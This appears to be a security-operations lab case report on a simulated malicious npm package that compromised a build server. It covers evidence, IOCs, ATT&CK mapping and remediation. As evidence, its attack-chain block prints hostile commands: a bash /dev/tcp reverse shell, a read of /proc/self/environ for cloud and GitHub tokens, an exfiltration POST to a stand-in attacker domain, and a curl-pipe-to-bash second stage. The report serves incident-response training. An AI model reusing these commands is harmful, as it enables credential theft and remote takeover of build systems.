# Case Report — CASE-03: Supply Chain via Malicious npm Package

| Field | Value |
|-------|--------|
| Severity | 🔴🔴 CRITICAL |
| Date/Time | 2024-03-10 11:22 UTC (approx) |
| Host | CORP-BUILD-SRV02 (Ubuntu) |
| User | cicd-runner |

## 1. Summary

Wiz and GitHub Advanced Security flagged malicious activity on build server CORP-BUILD-SRV02. A malicious npm package **colors-utils-pro@1.0.3** (maintainer **colorsutils.dev@protonmail.com**) ran a postinstall script that opened a reverse shell to **198.51.100.42:4444**, read `/proc/self/environ` (capturing CI secrets such as AWS and GitHub tokens), and exfiltrated data to **https://exfil.attacker-infra.com/drop?token=abc123**. A second-stage payload was fetched from **https://198.51.100.42/payload/rs.sh**. CloudTrail showed **ListBuckets** and **GetObject** from **corp-prod-secrets-bucket/prod/database.env** from **203.0.113.88**, with **CreateUser** denied. This is a supply chain compromise (T1195.001) with credential theft and cloud API abuse. Severity is CRITICAL due to access to production secrets and attempted privilege escalation in the cloud.

## 2. Evidence

### 2.1 Attack chain (simplified)

```
npm install (colors-utils-pro@1.0.3)
  → postinstall: node install.js
    → bash -i >& /dev/tcp/198.51.100.42/4444 0>&1  (reverse shell)
    → read /proc/self/environ (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN)
    → POST https://exfil.attacker-infra.com/drop?token=abc123
    → curl -fsSL https://198.51.100.42/payload/rs.sh | bash
  → Attacker uses stolen credentials from 203.0.113.88
    → ListBuckets (success)
    → GetObject corp-prod-secrets-bucket/prod/database.env (success)
    → CreateUser (AccessDenied)
```

### 2.2 Key Log Evidence

| Source | Finding |
|--------|---------|
| auditd / Sysmon-style | execve: node install.js (postinstall); bash reverse shell to 198.51.100.42:4444 |
| Falco | Outbound connection from npm postinstall to 198.51.100.42:4444; proc.name=node |
| auditd | openat /proc/self/environ (read of environment = secrets) |
| Log / comment | POST to https://exfil.attacker-infra.com/drop?token=abc123 |
| Log / comment | curl https://198.51.100.42/payload/rs.sh \| bash |
| CloudTrail | ListBuckets success, sourceIP 203.0.113.88 |
| CloudTrail | GetObject corp-prod-secrets-bucket/prod/database.env success |
| CloudTrail | CreateUser AccessDenied |
| npm audit | package colors-utils-pro@1.0.3; maintainer colorsutils.dev@protonmail.com; integrity SHA256 + MD5 |

### 2.3 Network Evidence

- Reverse shell: **198.51.100.42:4444** (TCP).
- Exfil endpoint: **exfil.attacker-infra.com** → **198.51.100.42**; URL **https://exfil.attacker-infra.com/drop?token=abc123**.
- Second stage: **https://198.51.100.42/payload/rs.sh**.
- CloudTrail API calls from **203.0.113.88** (likely attacker-controlled host using stolen credentials).
- DNS: **exfil.attacker-infra.com** → 198.51.100.42; **registry.npmjs.org** for package fetch.

## 3. Extracted IOCs

| Type | Value | Context |
|------|--------|---------|
| IPv4 | 198.51.100.42 | Reverse shell, payload server, exfil host |
| IPv4 | 203.0.113.88 | CloudTrail source (credential abuse) |
| Domain | exfil.attacker-infra.com | Exfil endpoint |
| URL | https://exfil.attacker-infra.com/drop?token=abc123 | Exfil POST |
| URL | https://198.51.100.42/payload/rs.sh | Second-stage script |
| File SHA256 | d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6 | npm package integrity |
| File MD5 | e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2 | npm package |
| Email | colorsutils.dev@protonmail.com | Malicious package maintainer |

### Reproduce IOC extraction

```bash
cd tools/ioc_extractor
python3 extractor.py -i ../../scenarios/case-03/logs/ -o ../../scenarios/case-03/iocs.json --pretty
```

## 4. OpenCTI Pivots

- Search **198.51.100.42** and **exfil.attacker-infra.com** for other supply chain or exfil events.
- Search **colorsutils.dev@protonmail.com** and package name for other malicious npm packages.
- Use **SOC-LAB** to group lab observables; link report to vulnerability or malware entities (e.g. malicious npm) if modeled in OpenCTI.
- Correlate **203.0.113.88** with other cloud or API abuse in the platform.

## 5. ATT&CK Mapping

| Tactic | Technique | Sub-technique | Evidence |
|--------|-----------|----------------|----------|
| Supply Chain | Compromise Software Supply Chain (T1195) | Compromise Software Dependencies and Development Tools (T1195.001) | Malicious npm postinstall |
| Execution | Unix Shell (T1059.004) | — | bash reverse shell; rs.sh |
| Credential Access | Unsecured Credentials (T1552.007) | Container API (e.g. env) | /proc/self/environ |
| Exfiltration | Exfiltration Over C2 (T1041) | — | POST to exfil.attacker-infra.com |
| Impact | Cloud Service Discovery (T1526) | — | ListBuckets |
| Privilege Escalation | Valid Accounts (T1078.004) | Cloud Accounts | CreateUser attempt with stolen creds |

## 6. Severity & Rationale

- **CRITICAL** because:
  - Production secrets (AWS, GitHub, database.env) were exposed to the attacker via environment variables.
  - Attacker successfully read **corp-prod-secrets-bucket/prod/database.env** from the cloud.
  - CreateUser attempt indicates intent for persistence or privilege escalation in the cloud.
  - Supply chain vector (npm) is hard to fully contain without broad dependency review and SBOM.

## 7. Containment, Eradication & Prevention

### Immediate Containment

1. Revoke all CI/CD credentials (AWS keys, GITHUB_TOKEN) that were present on CORP-BUILD-SRV02; rotate secrets in vaults and cloud.
2. Isolate CORP-BUILD-SRV02; block 198.51.100.42 and exfil.attacker-infra.com at egress and DNS.
3. Restrict or temporarily suspend access from 203.0.113.88 to cloud APIs; review IAM and access logs for other IPs using the same credentials.
4. Invalidate or rotate database credentials referenced in database.env.

### Eradication

1. Rebuild the build server from a clean image; remove colors-utils-pro and any other suspicious dependencies.
2. Audit all projects that depend on colors-utils-pro or the same maintainer; remove and replace with trusted packages.
3. Preserve evidence (disk image, process memory if captured, npm cache, CloudTrail logs) for IR and legal.
4. Report the package and maintainer to npm and GitHub (e.g. colorsutils.dev@protonmail.com).

### Prevention

1. Use lockfiles (package-lock.json, yarn.lock) and dependency review in CI; block installs of unknown or new maintainer packages without approval.
2. Run CI with least-privilege credentials; avoid exporting production AWS/GitHub secrets into build env; use OIDC or short-lived tokens.
3. Monitor outbound connections from build and CI hosts; alert on reverse shells and access to non-allowlisted domains.
4. Maintain SBOM and vulnerability scanning for open-source dependencies; consider a private npm mirror with curation.

## 8. Limitations

- Whether additional packages from the same maintainer are in use was not fully scoped in this report.
- Full list of secrets exfiltrated (beyond env vars and database.env) is unknown.
- No evidence of whether 203.0.113.88 is the same actor as 198.51.100.42 or a separate buyer of stolen credentials.
- Scope of access to other buckets or cloud resources using the same credentials was not fully analyzed here.
